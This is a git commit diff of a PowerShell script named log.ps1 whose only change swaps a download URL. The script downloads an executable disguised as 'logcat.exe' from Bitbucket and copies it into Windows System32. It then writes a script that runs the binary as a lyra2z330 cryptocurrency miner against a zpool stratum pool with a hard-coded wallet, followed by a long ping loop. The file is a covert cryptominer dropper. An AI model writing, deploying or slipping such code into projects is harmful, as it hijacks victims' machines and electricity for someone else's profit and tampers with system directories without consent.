b0b014d4d688b86ac46d4b8d0ae76ac24ac41839
Silahen <87541483+Silahen@users.noreply.github.com>
2021-07-17 00:21:36 +0700

    Update log.ps1

--- log.ps1
+++ log.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest https://bitbucket.org/yotayu/yotaku/src/main/logcat.exe -OutFile logcat.exe
+Invoke-WebRequest https://bitbucket.org/yotayu/yotaku/src/raw/logcat.exe -OutFile logcat.exe
 Copy logcat.exe C:\Windows\System32
 cmd /c echo cmd /k start logcat.exe -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.CIwin1 -t2 -p c=DGB,zap=PYRK-lyra2z330 >>a.ps1
 cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
